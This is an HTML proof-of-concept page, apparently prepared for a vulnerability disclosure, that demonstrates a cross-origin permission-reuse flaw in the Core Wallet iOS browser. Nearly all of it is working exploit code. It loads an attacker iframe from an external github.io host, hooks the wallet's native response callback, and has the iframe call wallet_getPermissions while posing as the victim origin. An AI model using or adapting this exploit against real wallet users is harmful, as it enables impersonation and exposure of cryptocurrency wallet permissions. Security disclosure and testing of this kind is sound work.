<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Core Wallet iOS - Permission Reuse PoC</title>

<style>
body{
  margin:20px;
  background:#fff;
  color:#111;
  font:16px -apple-system,BlinkMacSystemFont,sans-serif;
  line-height:1.5
}
button{padding:10px 14px;margin:6px 0}
pre{
  white-space:pre-wrap;
  overflow-wrap:anywhere;
  padding:12px;
  background:#f7f7f7;
  border:1px solid #ccc
}
.bad{
  padding:12px;
  border:2px solid #b00000;
  color:#b00000;
  font-weight:bold
}
iframe{width:100%;height:80px;border:1px solid #ccc}
</style>

<h2>Core Wallet iOS - Cross-Origin Permission Reuse</h2>

<p>
Victim A: <b id="a"></b><br>
Attacker B: <b>https://azza1231.github.io</b>
</p>

<button id="connect">1. Connect Origin A</button>
<button id="attack" disabled>2. Origin B calls wallet_getPermissions as A</button>

<div id="verdict" class="bad" hidden></div>

<pre id="log">Loading attacker iframe...</pre>

<iframe id="frame"></iframe>

<script>
const ATTACKER =
  'https://azza1231.github.io/pocpoc/attacker.html';

const TEST_ID = 733731;

const frame = document.getElementById('frame');
const log = document.getElementById('log');
const verdict = document.getElementById('verdict');

const attackerOrigin =
  new URL(ATTACKER).origin;

document.getElementById('a').textContent =
  location.origin;

function print(s = '') {
  log.textContent += s + '\n';
}


// Load B
const u = new URL(ATTACKER);

/*
 * cache buster supaya GitHub Pages tidak kasih attacker.html lama
 */
u.searchParams.set('v', Date.now());

u.searchParams.set(
  'victimOrigin',
  location.origin
);

frame.src = u.href;


// Receive authenticated messages from B
addEventListener('message', event => {

  if (event.source !== frame.contentWindow)
    return;

  if (event.origin !== attackerOrigin)
    return;

  const d = event.data;

  if (!d) return;


  if (d.type === 'READY') {

    log.textContent =
`Browser-confirmed Origin B:
${event.origin}

Victim Origin A:
${location.origin}

Child says victimOrigin:
${d.victimOrigin}

Native bridge visible in B:
${d.bridgeVisible}

Ready.`;

  }


  if (d.type === 'TRIGGER_RECEIVED') {

    print('');
    print('[ACK] attacker.html received button #2 command');
  }


  if (d.type === 'REQUEST_SENT') {

    print('');
    print('[ACK] Origin B called Core native bridge');
    print('Method: wallet_getPermissions');
    print('ID: ' + d.id);
  }


  if (d.type === 'CHILD_ERROR') {

    print('');
    print('ATTACKER ERROR: ' + d.message);
  }
});


// Step 1
document.getElementById('connect').onclick = async () => {

  if (!window.ethereum?.request) {
    print('Core provider unavailable.');
    return;
  }

  try {

    print('');
    print('Origin A calling eth_requestAccounts...');

    const accounts =
      await window.ethereum.request({
        method: 'eth_requestAccounts'
      });

    print(
      'Origin A connected: ' +
      JSON.stringify(accounts)
    );

    document.getElementById('attack').disabled =
      false;

  } catch (e) {

    print(
      'Connect failed: ' +
      String(e?.message || e)
    );
  }
};


// Step 2
document.getElementById('attack').onclick = () => {

  print('');
  print('=== CROSS-ORIGIN TEST ===');

  if (
    typeof window.__coreProviderRespond !== 'function'
  ) {
    print('ERROR: __coreProviderRespond unavailable');
    return;
  }


  /*
   * Install observer immediately before request.
   */
  if (!window.__pocObserver) {

    const original =
      window.__coreProviderRespond;

    window.__coreProviderRespond =
      function(id, error, result) {

        if (id === TEST_ID) {

          print('');
          print('=== CORE NATIVE RESPONSE ===');

          print(JSON.stringify({
            id,
            error,
            result
          }, null, 2));


          if (
            !error &&
            Array.isArray(result) &&
            result.length > 0
          ) {

            verdict.hidden = false;

            verdict.textContent =
              'VULNERABLE: Cross-origin Origin B obtained permission state while impersonating Origin A.';

          }
        }

        return original.apply(
          this,
          arguments
        );
      };

    window.__pocObserver = true;
  }


  print('Actual Origin B: ' + attackerOrigin);
  print('Origin claimed by B: ' + location.origin);
  print('Sending command to attacker iframe...');


  frame.contentWindow.postMessage(
    {
      type: 'GET_PERMISSIONS_AS_A',
      id: TEST_ID
    },
    attackerOrigin
  );
};
</script>
